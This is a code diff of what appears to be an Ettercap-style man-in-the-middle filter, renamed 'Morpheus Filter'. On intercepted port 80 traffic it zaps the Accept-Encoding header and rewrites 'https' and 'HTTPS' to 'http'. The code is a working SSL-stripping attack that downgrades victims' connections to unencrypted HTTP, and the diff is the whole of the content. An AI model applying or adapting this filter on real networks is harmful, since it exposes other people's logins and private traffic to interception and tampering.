@@ -1,7 +1,6 @@
 ############################################################################
 #                                                                          #
 #  HTTPS Request/Response Filter                                           #
-#                                                                          #
 #  based on code from ALoR & NaGA                                          #
 #                                                                          #
 #  This program is free software; you can redistribute it and/or modify    #
@@ -12,11 +11,10 @@
 ############################################################################
 
 ##
-#
 #  This filter will substitute the word 'https' with 'http' on
 #  both HTTP requests and responses.
-#
 ##
+
 
 ##########################
 ## Zap Content Encoding ##
@@ -25,7 +23,7 @@ if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
       replace("Accept-Encoding", "Accept-Rubbish!"); 
 	# note: replacement string is same length as original string
-	msg("[HTTP Response Filter] Encoding zapped.\n");
+        msg("[Morpheus Filter] Encoding zapped.\n");
    }
 }
 
@@ -36,14 +34,13 @@ if (ip.proto == TCP && tcp.dst == 80) {
 ##
 # Requests
 if (ip.proto == TCP && tcp.dst == 80) {
-  # msg("[HTTP Response Filter] HTTP request seen.\n");
    if (search(DECODED.data, "https")){
       replace("https", "http"); 
-      msg("[HTTP Response Filter] *** HTTPS ZAPPED from request\n");
+      msg("[Morpheus Filter] https zapped from request.\n");
    }
-   if (search(DATA.data, "https")){
-      replace("https", "http"); 
-      msg("[HTTP Response Filter] *** HTTPS ZAPPED from request\n");
+   if (search(DATA.data, "HTTPS")){
+      replace("HTTPS", "HTTP");
+      msg("[Morpheus Filter] HTTPS zapped from request.\n"); 
    }
 }
 
